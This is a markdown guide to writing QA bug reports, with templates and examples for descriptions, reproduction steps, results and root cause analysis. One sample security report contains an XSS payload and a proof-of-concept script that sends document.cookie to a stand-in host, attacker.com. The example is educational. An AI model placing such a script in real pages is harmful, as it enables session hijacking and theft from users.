## 📝 Description

Provide a **clear and concise description** of the issue.

### What to Include:

- 📍 **What** is happening (the symptom)
- 📍 **Where** it is happening (module/page)
- 📍 **When** it occurs (conditions/triggers)
- 📍 **Why** it's a problem (business impact)

### Template:

```markdown
When [ACTION], the system [UNEXPECTED BEHAVIOR] instead of [EXPECTED BEHAVIOR].
This prevents users from [IMPACT/CONSEQUENCE].
```

### Examples:

**Good Description:**
```
When users enter valid credentials on the login page and click "Sign In", 
the system displays "Invalid credentials" error despite the credentials 
being correct. This prevents users from accessing their accounts and 
blocks all authenticated features.
```

**Enhanced with Business Impact:**
```
The payment gateway integration fails to process transactions when the 
cart total exceeds $1000. This results in a 502 Gateway Timeout error 
after 30 seconds. This is causing significant revenue loss as high-value 
orders cannot be completed, affecting approximately 15% of transactions.
```

---

## 🔁 Steps to Reproduce

Write **clear, sequential, numbered steps** that anyone can follow to reproduce the issue.

### Guidelines:

- ✅ Start from a known state (e.g., "Logged out")
- ✅ Number each step
- ✅ Be specific (exact button names, field labels)
- ✅ Include test data used
- ✅ Mention timing if relevant (wait times, delays)

### Template:

```markdown
**Preconditions:**
- [List any setup required]

**Steps:**
1. [First action]
2. [Second action]
3. [Third action]
4. [Observe the result]

**Test Data:**
- [Specific data used]
```

### Example:

```markdown
**Preconditions:**
- User account exists: testuser@example.com
- User is logged out
- Browser cache is cleared

**Steps:**
1. Navigate to https://app.example.com/login
2. Enter email: testuser@example.com
3. Enter password: Test@1234
4. Click "Sign In" button
5. Observe the result

**Test Data:**
- Email: testuser@example.com
- Password: Test@1234
```

> [!WARNING]
> Steps that cannot be reproduced by others will delay bug resolution. Verify reproducibility before logging.

---

## ✅ Expected vs Actual Results

### Expected Result

Describe what **should happen** according to requirements or specifications.

**Template:**
```markdown
After [ACTION], the system should:
- [Expected behavior 1]
- [Expected behavior 2]
- [Expected outcome]
```

**Example:**
```markdown
After clicking "Sign In" with valid credentials, the system should:
- Authenticate the user successfully
- Redirect to the dashboard at /dashboard
- Display welcome message: "Welcome back, [Username]!"
- Create a session cookie with 30-minute expiry
```

---

### Actual Result

Describe what **actually happened** (the defect).

**Template:**
```markdown
Instead of [EXPECTED], the following occurred:
- [Actual behavior observed]
- [Error message, if any]
- [System state after issue]
```

**Example:**
```markdown
Instead of successful login, the following occurred:
- Error message displayed: "Invalid email or password"
- User remains on login page
- No session is created
- Console shows error: "Authentication failed - 401 Unauthorized"
```

## 🔍 Root Cause Analysis (RCA)

For critical bugs, include root cause analysis after investigation:

### Template:

```markdown
## Root Cause Analysis

**Root Cause:**
[What caused the bug - code issue, configuration, environment]

**Why It Happened:**
[Reason it was missed - lack of test coverage, edge case, integration issue]

**How to Prevent:**
[Preventive measures - add tests, update validation, improve monitoring]

**Related Issues:**
[Links to similar bugs or technical debt]
```

### Example:

```markdown
## Root Cause Analysis

**Root Cause:**
Database timeout occurs when user count exceeds 10,000 concurrent sessions 
due to missing connection pool configuration.

**Why It Happened:**
Load testing was performed with max 1,000 users. Connection pool size 
defaulted to 100, insufficient for production load.

**How to Prevent:**
1. Add load test with realistic user counts (15,000+ concurrent)
2. Configure connection pool size based on expected load
3. Implement connection monitoring and alerts

**Related Issues:**
- BUG-1145: Similar timeout in payment gateway
- TECH-DEBT-67: Missing production load testing

### Example 5: Security Bug

````markdown
# Bug Report: XSS Vulnerability in Comment Field

**Bug ID:** BUG-2049  
**Module:** Comments  
**Severity:** 🔴 Critical  
**Priority:** P0 - Critical  

## Description

**SECURITY VULNERABILITY:** The comment field does not sanitize user 
input, allowing Cross-Site Scripting (XSS) attacks.

## Steps to Reproduce

1. Navigate to any post page
2. Enter comment: `<script>alert('XSS')</script>`
3. Submit comment
4. Refresh page

## Expected Result

Script tags should be escaped/sanitized and displayed as plain text.

## Actual Result

JavaScript executes - alert box appears. Malicious scripts can:
- Steal session tokens
- Redirect users
- Inject malicious content

## Proof of Concept

```html
<script>
  // Steal cookies
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

## Recommendation

Implement input sanitization using DOMPurify or similar library.

## 🧠 Best Practices

### ✅ DO:

- ✔️ **Be specific and objective** - Stick to facts, avoid opinions
- ✔️ **One bug per ticket** - Don't combine multiple issues
- ✔️ **Verify reproducibility** - Reproduce at least twice before logging
- ✔️ **Choose correct severity/priority** - Based on actual impact
- ✔️ **Attach visual evidence** - Screenshots or recordings
- ✔️ **Include environment details** - OS, browser, version
- ✔️ **Link related issues** - Reference similar bugs or requirements
- ✔️ **Update status promptly** - Keep bug status current
- ✔️ **Retest thoroughly** - Verify fix before closing
- ✔️ **Check for duplicates** - Search before creating new bug

### ❌ DON'T:

- ✖️ **Don't use vague titles** - "App broken" is useless
- ✖️ **Don't skip steps to reproduce** - Developers can't fix what they can't reproduce
- ✖️ **Don't use emotional language** - "Horrible bug" → "Critical defect"
- ✖️ **Don't mix multiple bugs** - Each bug needs separate ticket
- ✖️ **Don't ignore severity guidelines** - Don't mark everything critical
- ✖️ **Don't report without verification** - Ensure it's actually a bug
- ✖️ **Don't Auto-close*** - Always retest before marking fixed
- ✖️ **Don't forget test data** - Include exact inputs used

---

## ⚠️ Common Mistakes

| Mistake | Impact | Solution |
|---------|--------|----------|
| Vague bug title | Wastes developer time searching for context | Use descriptive format: `[Module] Issue description` |
| Missing reproduction steps | Bug won't be fixed | Provide clear, numbered steps |
| Wrong severity/priority | Delays critical fixes or wastes resources | Follow severity/priority guidelines |
| No attachments | Developer cannot see the issue | Always attach screenshots/recordings |
| Mixing multiple bugs | Confusion, incomplete fixes | One bug per ticket |
| Not retesting | Bugs reopen in production | Always verify fix before closing |
| Emotional language | Unprofessional, damages relationships | Use objective, factual descriptions |
